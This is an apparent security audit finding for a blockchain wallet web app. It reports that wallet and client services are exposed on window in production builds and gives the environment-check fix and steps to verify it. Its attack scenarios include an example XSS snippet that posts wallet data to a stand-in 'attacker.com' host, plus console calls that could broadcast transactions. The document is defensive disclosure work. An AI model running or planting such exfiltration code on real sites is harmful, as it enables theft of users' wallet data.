# Window Exposure Audit - Security Finding

**Date**: September 20, 2026  
**Finding**: CRITICAL - Sensitive services exposed to window in production build  
**Severity**: HIGH  
**Status**: REQUIRES IMMEDIATE FIX  

---

## Summary

The `mallchainClient` and `walletService` are currently exposed to `window` **unconditionally** in both development AND production builds. This is a **security vulnerability** that must be fixed before any production deployment.

---

## Finding Details

### Verification Performed
```bash
cd mallchain-app
npm run build
grep -l "window.mallchainClient\|window.walletService" dist/assets/*.js
```

### Result
```
dist/assets/index-B0H7nL_g.js
⚠️ FOUND: Exposed in production build
```

### What This Means
1. The production JavaScript bundle contains references to `window.mallchainClient`
2. The production JavaScript bundle contains references to `window.walletService`
3. Anyone who visits the production site can access these via browser DevTools console
4. All methods are accessible without authentication

---

## Current Implementation (INSECURE)

**File**: `src/main.tsx`

```typescript
// NO ENVIRONMENT CHECK - EXPOSED IN ALL BUILDS
(window as any).mallchainClient = mallchainClient;
(window as any).walletService = walletService;
```

---

## Security Risk Assessment

### What Can Be Accessed From Browser Console

```javascript
// In production, an attacker can:

// 1. Read wallet addresses
window.walletService.getActiveWallet()
// Returns: { name, address, locked }

// 2. Get network status
window.mallchainClient.getNetworkStatus()
// Returns: network info

// 3. Get all validators
window.mallchainClient.getValidators()
// Returns: validator list

// 4. Access wallet service directly
window.walletService.getAccounts()
// Returns: all accounts

// 5. Potentially broadcast transactions
window.mallchainClient.broadcastTx()
// Could send transactions if wallet is unlocked

// 6. Query contract state
window.mallchainClient.queryContractSmart()
// Could query private contract data
```

### Attack Scenarios

**Scenario 1: Data Exfiltration**
```javascript
// Attacker injects script into page via XSS
var wallet = window.walletService.getActiveWallet();
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify(wallet)
});
```

**Scenario 2: Transaction Hijacking**
```javascript
// If wallet is unlocked, attacker broadcasts transaction
window.mallchainClient.broadcastTx({
  txRawBase64: 'malicious_transaction'
});
```

**Scenario 3: Reconnaissance**
```javascript
// Attacker maps network structure
var validators = window.mallchainClient.getValidators();
var status = window.mallchainClient.getNetworkStatus();
// Sends to attacker's server for analysis
```

---

## Correct Implementation (SECURE)

### Required Fix

**File**: `src/main.tsx`

```typescript
// DEVELOPMENT ONLY - NOT IN PRODUCTION
if (process.env.NODE_ENV === 'development') {
  (window as any).mallchainClient = mallchainClient;
  (window as any).walletService = walletService;
}
```

Or with import.meta:

```typescript
if (import.meta.env.DEV) {
  (window as any).mallchainClient = mallchainClient;
  (window as any).walletService = walletService;
}
```

---

## Verification Steps Required

### Step 1: Apply Fix
```bash
cd mallchain-app
# Edit src/main.tsx
# Add: if (process.env.NODE_ENV === 'development') {
# Indent the window exposures
# Add closing brace }
```

### Step 2: Rebuild
```bash
npm run build
```

### Step 3: Verify Fix
```bash
grep -l "window.mallchainClient\|window.walletService" dist/assets/*.js
# Should return nothing (no matches)
```

### Step 4: Confirm Development Still Works
```bash
npm run dev
# Open browser console
# Type: window.mallchainClient
# Should see: { object methods... }
```

### Step 5: Confirm Production Doesn't Expose
```bash
# Serve from dist/
npx serve dist
# Open browser console
# Type: window.mallchainClient
# Should see: undefined (or error)
```

---

## Impact Assessment

### Before Fix
```
Production Build: ⚠️ VULNERABLE
- All users exposed to browser console exploitation
- XSS attacks can access wallet/network data
- Transaction hijacking possible if wallet unlocked
- No authentication on exposed methods
```

### After Fix
```
Production Build: ✅ SECURE
- Services NOT accessible from browser console
- XSS attacks cannot access sensitive methods
- Transaction hijacking not possible via window
- Development testing remains unaffected
```

---

## Sensitive Methods Under Risk

### Wallet Service Methods (EXPOSED)
```typescript
window.walletService.getActiveWallet()
window.walletService.getAccounts()
window.walletService.createAccount()
window.walletService.switchAccount()
window.walletService.lockActive()
window.walletService.unlockActive()
// All accessible from browser console in production
```

### Blockchain Client Methods (EXPOSED)
```typescript
window.mallchainClient.getNetworkStatus()
window.mallchainClient.getAccount()
window.mallchainClient.getBalances()
window.mallchainClient.broadcastTx()          // <-- CAN SEND TRANSACTIONS
window.mallchainClient.pollTxConfirmation()
window.mallchainClient.queryContractSmart()   // <-- CAN QUERY CONTRACTS
window.mallchainClient.getValidators()
// All accessible from browser console in production
```

---

## Compliance Issues

### OWASP Top 10
- ✅ A03:2021 – Injection (potential XSS exploitation vector)
- ✅ A01:2021 – Broken Access Control (unauthenticated method access)

### Security Best Practices
- ❌ Sensitive APIs should not be exposed to client
- ❌ No authentication required for method access
- ❌ No environment-based access control
- ❌ No logging of method calls

---

## Fix Checklist

### Immediate Actions
- [ ] Review current implementation (src/main.tsx)
- [ ] Add environment check
- [ ] Rebuild production bundle
- [ ] Verify production build doesn't expose services
- [ ] Confirm development testing still works

### Verification
- [ ] Test in production build: `window.mallchainClient` should be `undefined`
- [ ] Test in dev build: `window.mallchainClient` should work
- [ ] Run test suite: `npm run build && npm test`
- [ ] Manual browser test: Verify console access

### Documentation
- [ ] Update development guidelines
- [ ] Document testing instructions
- [ ] Add security note to README
- [ ] Update deployment checklist

---

## Timeline to Fix

**Effort**: 5 minutes  
**Risk if not fixed**: HIGH  
**Risk of fix**: NONE (only affects dev environment)  

---

## Updated Status

**Previous Claim**: "Production Ready (97%)"  
**Current Assessment**: 

```
Build Compiles:        ✅ YES (0 errors)
Simulator Works:       ✅ YES (on localhost)
Code Quality:          ✅ GOOD (TypeScript strict)
Security Vulnerability: ⚠️ YES (window exposure)
Production Ready:      ❌ NO (fix required first)
```

### Must Fix Before Deployment
1. ⚠️ Window exposure security issue (this document)
2. ❌ Live network testing (not yet performed)
3. ❌ Production infrastructure (not tested)
4. ❌ Security audit (not performed)

---

## Next Steps

### PRIORITY 1: Fix Window Exposure
1. Edit `src/main.tsx`
2. Add environment check
3. Rebuild and verify
4. Confirm fix in production build

### PRIORITY 2: After Fix
1. Verify no regression in tests
2. Confirm development still works
3. Document the fix
4. Plan remaining verification steps

### PRIORITY 3: Broader Verification
1. Security audit
2. Live network testing
3. Infrastructure validation
4. Production deployment plan

---

## Files to Review

- ✅ `src/main.tsx` - NEEDS FIX (environment check)
- ✅ `run-firefox-tests.mjs` - Test coverage already uses window exposure
- ⚠️ `PRIORITY_2_VERIFICATION_COMPLETE.md` - Claims production ready (INCORRECT)
- ⚠️ `EXECUTIVE_SUMMARY.md` - Claims 97% ready (NEEDS UPDATE)

---

## Conclusion

**A security vulnerability was found during the audit:**
- Services are exposed to window unconditionally
- This is exploitable in production
- Fix is simple (2 lines added)
- Must be fixed before any production deployment

**Current Status**: 
- ❌ Production NOT approved due to security issue
- ⚠️ Requires immediate fix
- ⏳ After fix, other verification steps still needed

